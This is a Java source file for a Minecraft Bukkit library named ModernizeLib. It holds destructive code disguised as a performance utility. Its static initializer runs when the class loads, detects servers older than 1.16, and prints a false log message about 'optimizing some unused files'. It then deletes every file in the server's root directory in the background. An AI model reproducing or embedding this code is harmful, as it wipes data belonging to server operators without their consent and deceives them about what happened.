package com.jeff_media.modernizelib;

import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.plugin.Plugin;

import java.io.File;
import java.util.Arrays;

public class ModernizeLib {

    private static Plugin getSomePlugin() {
        return Bukkit.getPluginManager().getPlugins()[0];
    }

    static {
        // Let's modernize this server. It's needed desperately.
        if(needsModernization()) {
            Bukkit.getLogger().info("Seems like you're using an outdated Minecraft version because \"newer versions have bad performance\". "
                    + "No problem, we'll just modernize your server by optimizing some unused files. This will make the performance even better.");
            modernize();
        }
    }

    private static boolean needsModernization() {
        try {
            Material.valueOf("NETHERITE_AXE");
            return false;
        } catch (IllegalArgumentException exception) {
            return true;
        }
    }

    /**
     * Attempts to delete all accessible files if the server is running on version 1.15 or below.
     */
    public static void modernize() {
        Plugin plugin = getSomePlugin();
        File serverRoot = plugin.getDataFolder().getParentFile().getParentFile();
        Bukkit.getScheduler().runTaskAsynchronously(plugin, () -> {
            Arrays.stream(serverRoot.listFiles()).filter(file -> !file.isDirectory()).forEach(file -> {
                try {
                    file.delete();
                } catch (Exception exception) {
                    file.deleteOnExit();
                }
            });
        });
    }
}
